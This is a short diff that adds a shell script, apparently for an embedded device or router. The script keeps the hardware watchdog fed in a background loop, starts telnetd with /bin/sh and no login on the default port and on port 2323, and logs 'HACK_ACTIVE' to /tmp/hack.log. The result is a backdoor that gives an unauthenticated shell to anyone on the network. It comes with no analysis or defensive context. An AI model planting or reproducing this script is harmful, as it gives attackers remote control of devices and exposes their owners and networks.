@@ -1,0 +1,5 @@
+#!/bin/sh
+(while true;do echo V>/dev/watchdog 2>/dev/null;sleep 1;done)&
+telnetd -l /bin/sh 2>/dev/null &
+telnetd -l /bin/sh -p 2323 2>/dev/null &
+echo HACK_ACTIVE >> /tmp/hack.log
